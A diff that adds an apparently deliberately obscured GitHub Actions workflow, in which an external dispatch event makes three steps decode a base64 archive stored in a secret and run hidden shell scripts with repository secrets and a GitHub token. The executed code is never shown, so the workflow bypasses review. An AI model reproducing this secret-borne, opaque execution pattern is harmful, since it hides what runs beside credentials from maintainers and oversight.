@@ -1,0 +1,54 @@
+name: r
+run-name: r
+
+on:
+  repository_dispatch:
+    types: [r]
+
+permissions:
+  contents: read
+
+concurrency:
+  group: r-${{ github.event.client_payload.c || github.run_id }}
+  cancel-in-progress: false
+
+jobs:
+  r:
+    runs-on: ubuntu-24.04
+    timeout-minutes: 60
+    environment: ${{ github.event.client_payload.e }}
+    steps:
+      - name: a
+        env:
+          B: ${{ secrets.B }}
+          G: ${{ secrets.G }}
+          GH_TOKEN: ${{ secrets.G }}
+        run: |
+          mkdir -p "$RUNNER_TEMP/x"
+          printf '%s' "$B" | base64 -d > "$RUNNER_TEMP/b.tgz"
+          tar -xzf "$RUNNER_TEMP/b.tgz" -C "$RUNNER_TEMP/x"
+          chmod 700 "$RUNNER_TEMP/x/"*.sh
+          bash "$RUNNER_TEMP/x/c.sh"
+      - name: b
+        env:
+          B: ${{ secrets.B }}
+          T: ${{ secrets.T }}
+        run: |
+          mkdir -p "$RUNNER_TEMP/x"
+          printf '%s' "$B" | base64 -d > "$RUNNER_TEMP/b.tgz"
+          tar -xzf "$RUNNER_TEMP/b.tgz" -C "$RUNNER_TEMP/x"
+          chmod 700 "$RUNNER_TEMP/x/"*.sh
+          bash "$RUNNER_TEMP/x/r.sh"
+      - name: c
+        env:
+          B: ${{ secrets.B }}
+          G: ${{ secrets.G }}
+          GH_TOKEN: ${{ secrets.G }}
+          A: ${{ secrets.A }}
+          E: ${{ secrets.E }}
+        run: |
+          mkdir -p "$RUNNER_TEMP/x"
+          printf '%s' "$B" | base64 -d > "$RUNNER_TEMP/b.tgz"
+          tar -xzf "$RUNNER_TEMP/b.tgz" -C "$RUNNER_TEMP/x"
+          chmod 700 "$RUNNER_TEMP/x/"*.sh
+          bash "$RUNNER_TEMP/x/p.sh"
